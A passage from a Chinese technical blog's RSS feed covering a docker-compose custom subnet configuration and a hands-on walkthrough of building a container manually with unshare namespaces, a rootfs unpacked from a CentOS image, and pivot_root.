<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        TX</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> errors</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  dropped</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> overruns</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  carrier</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  collisions</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>该网段也有可能与，已有网段重复，若要修改此网段，可按如下步骤进行。安全停掉所有用docker-compose编排的容器，这里建议使用docker-compose down来彻底停掉容器，并自动帮你移除docker-compose之前创建的网桥。之后修改docker-compose.yml文件，增加自定义网络段，如下所示。</p>
<div class="language-yaml line-numbers-mode" data-highlighter="shiki" data-ext="yaml" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-yaml"><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'2.1'</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">services</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  test-service</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    image</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">xxx</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    container_name</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">xxxxx</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    restart</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">always</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    networks</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">      - </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">as4k-test</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">networks</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  as4k-test</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    ipam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      config</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        - </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">subnet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">172.16.238.0/24</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">          gateway</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">172.16.238.1</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>用新的docker-compose文件，启动容器。</p>
]]></content:encoded>
    </item>
    <item>
      <title>纯手工制作容器-Docker原理</title>
      <link>https://www.geekery.cn/note-book/Docker/%E7%BA%AF%E6%89%8B%E5%B7%A5%E5%88%B6%E4%BD%9C%E5%AE%B9%E5%99%A8-Docker%E5%8E%9F%E7%90%86.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/%E7%BA%AF%E6%89%8B%E5%B7%A5%E5%88%B6%E4%BD%9C%E5%AE%B9%E5%99%A8-Docker%E5%8E%9F%E7%90%86.html</guid>
      <source url="https://www.geekery.cn/rss.xml">纯手工制作容器-Docker原理</source>
      <description>纯手工制作容器-Docker原理 前提 准备rootfs文件系统 因为手工制作优化过程繁琐，请看我的另一篇文档手工制作 本文章使用 Docker 镜像解压出来作为rootfs 准备一个NameSpace USER隔离 UTS隔离 实验过程 测试过程 MNT/IPC/PID隔离 NET隔离 检查</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>前提</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 删除share选项防止mnt共享</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# grep root /proc/self/mountinfo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">40</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 253:0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rw,relatime</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> shared:1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> xfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/mapper/centos_monther-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rw,seclabel,attr2,inode64,noquota</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# mount --make-rprivate /</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# grep root /proc/self/mountinfo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">40</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 253:0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rw,relatime</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> xfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/mapper/centos_monther-root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rw,seclabel,attr2,inode64,noquota</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>准备rootfs文件系统</h2>
<blockquote>
<p>因为手工制作优化过程繁琐，请看我的另一篇文档手工制作</p>
<p>本文章使用 Docker 镜像解压出来作为rootfs</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> export</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> centos:8.3.2011</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tar</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -xvf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container rootfs]# pwd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/root/mkRootfs/rootfs</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container rootfs]# ls</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">anaconda-post.log</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  bin</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  etc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  home</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  lib</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  lib64</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  media</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  mnt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  opt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  proc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  run</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  sbin</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  srv</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  sys</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  tmp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  usr</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  var</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>准备一个NameSpace</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container mkRootfs]# echo </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">$$</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1593</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container mkRootfs]# unshare --mount --uts --ipc --net --pid --fork /bin/bash</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container mkRootfs]# echo </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">$$</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">1</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container mkRootfs]#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>USER隔离</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 默认已经隔离</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# id</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">uid</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">gid</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">groups</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">context</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]#</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]#</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# cat /etc/passwd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root:x:0:0:root:/root:/bin/bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bin:x:1:1:bin:/bin:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">adm:x:3:4:adm:/var/adm:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sync:x:5:0:sync:/sbin:/bin/sync</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">halt:x:7:0:halt:/sbin:/sbin/halt</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">operator:x:11:0:operator:/root:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">games:x:12:100:games:/usr/games:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ftp:x:14:50:FTP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> User:/var/ftp:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nobody:x:99:99:Nobody:/:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemd-network:x:192:192:systemd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Management:/:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">dbus:x:81:81:System</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> message</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bus:/:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">polkitd:x:999:998:User</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> polkitd:/:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sshd:x:74:74:Privilege-separated</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SSH:/var/empty/sshd:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">postfix:x:89:89::/var/spool/postfix:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chrony:x:998:996::/var/lib/chrony:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]#</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# id</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">uid</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">gid</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">groups</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container /]# cat /etc/passwd</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root:x:0:0:root:/root:/bin/bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bin:x:1:1:bin:/bin:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">adm:x:3:4:adm:/var/adm:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sync:x:5:0:sync:/sbin:/bin/sync</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">halt:x:7:0:halt:/sbin:/sbin/halt</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">operator:x:11:0:operator:/root:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">games:x:12:100:games:/usr/games:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ftp:x:14:50:FTP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> User:/var/ftp:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nobody:x:65534:65534:Kernel</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Overflow</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> User:/:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">dbus:x:81:81:System</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> message</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bus:/:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemd-coredump:x:999:997:systemd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Core</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Dumper:/:/sbin/nologin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemd-resolve:x:193:193:systemd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Resolver:/:/sbin/nologin</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>UTS隔离</h3>
<p>实验过程</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 标记宿主机主机名</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@monther mkRootfs]# hostnamectl set-hostname out-container</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@monther mkRootfs]# exec bash</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container mkRootfs]#</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 标记容器主机名</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container mkRootfs]# hostname in-container &amp;&amp; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">exec</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container rootfs]#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>测试过程</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@out-container ~]# hostname</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">out-container</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>MNT/IPC/PID隔离</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container mkRootfs]# mount -t proc none /proc</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container mkRootfs]# ps -ef</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">UID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">         PID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   PPID</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  C</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> STIME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TTY</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">          TIME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CMD</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">          1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:55</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pts/0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">         21</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 10:10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pts/0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    00:00:00</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -ef</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container rootfs]# mount --bind /root/mkRootfs/rootfs/ /root/mkRootfs/rootfs/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container rootfs]# cd /root/mkRootfs/rootfs/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container rootfs]# mkdir oldroot</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container rootfs]# pivot_root </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">.</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> oldroot/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@in-container rootfs]# cd /</span></span>
